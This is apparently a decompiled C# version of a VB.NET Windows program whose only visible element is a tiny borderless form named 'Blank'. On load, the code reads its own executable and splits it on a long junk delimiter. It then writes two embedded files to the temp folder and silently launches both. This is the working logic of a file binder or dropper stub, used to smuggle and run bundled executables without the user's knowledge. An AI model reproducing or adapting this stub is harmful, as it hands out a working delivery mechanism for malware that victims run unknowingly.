using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace WindowsApplication1;

[DesignerGenerated]
public class Blank : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	private string filesplit
	{
		[DebuggerNonUserCode]
		get;
		[DebuggerNonUserCode]
		set;
	}

	[DebuggerNonUserCode]
	public Blank()
	{
		((Form)this).add_Load((EventHandler)delegate
		{
			loads();
		});
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(10, 10);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Blank");
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Control)this).ResumeLayout(false);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void loads()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string tempPath = default(string);
		string[] array = default(string[]);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 420:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0013;
						case 4:
							goto IL_0021;
						case 5:
							goto IL_0034;
						case 6:
							goto IL_0044;
						case 7:
							goto IL_0059;
						case 8:
							goto IL_0070;
						case 9:
							goto IL_0082;
						case 10:
							goto IL_009a;
						case 11:
							goto IL_00b1;
						case 12:
							goto IL_00c9;
						case 13:
							goto IL_00e1;
						case 14:
							goto IL_00f8;
						case 15:
							goto IL_0110;
						case 16:
							goto IL_0123;
						case 17:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 18:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0123:
					num = 16;
					Process.Start(tempPath + array[4]);
					break;
					IL_0110:
					num = 15;
					Process.Start(tempPath + array[3]);
					goto IL_0123;
					IL_000a:
					num = 2;
					tempPath = Path.GetTempPath();
					goto IL_0013;
					IL_0013:
					num = 3;
					filesplit = "6536456345bv345v6325965vckdsfjvxhfvv645vb64615456bw46b46547645enw7e5reuanetabtdynfhhhueueyuryy77475747dhfdfnfbbfhfdffbbshh3387778783778fdnnvbbdhggfdgfgshgsdgfggrsyeeyryeryeyryereyreryeryeryrggygyegfygeyfgeyfgeygfeygyfegfyegyefgyefgeyfgfyegfyegfygeyfgeyfegyfgfyefgeyfegygwuyfgwrvwvrygegeytgeyvgteygtvyetetetevtevtevt574747n5867neumyyjljo,;ktavaerWRCrv55sb6erysysbrybsybybdryyyyyyyyq36vhvh";
					goto IL_0021;
					IL_0021:
					num = 4;
					FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
					goto IL_0034;
					IL_0034:
					num = 5;
					text = Strings.Space(checked((int)FileSystem.LOF(1)));
					goto IL_0044;
					IL_0044:
					num = 6;
					FileSystem.FileGet(1, ref text, -1L, false);
					goto IL_0059;
					IL_0059:
					num = 7;
					FileSystem.FileClose(new int[1] { 1 });
					goto IL_0070;
					IL_0070:
					num = 8;
					array = Strings.Split(text, filesplit, -1, (CompareMethod)0);
					goto IL_0082;
					IL_0082:
					num = 9;
					FileSystem.FileOpen(3, tempPath + array[3], (OpenMode)32, (OpenAccess)3, (OpenShare)(-1), -1);
					goto IL_009a;
					IL_009a:
					num = 10;
					FileSystem.FilePut(3, array[1], -1L, false);
					goto IL_00b1;
					IL_00b1:
					num = 11;
					FileSystem.FileClose(new int[1] { 3 });
					goto IL_00c9;
					IL_00c9:
					num = 12;
					FileSystem.FileOpen(5, tempPath + array[4], (OpenMode)32, (OpenAccess)3, (OpenShare)(-1), -1);
					goto IL_00e1;
					IL_00e1:
					num = 13;
					FileSystem.FilePut(5, array[2], -1L, false);
					goto IL_00f8;
					IL_00f8:
					num = 14;
					FileSystem.FileClose(new int[1] { 5 });
					goto IL_0110;
					end_IL_0001_2:
					break;
				}
				num = 17;
				((Form)this).Close();
				ProjectData.EndApp();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 420;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
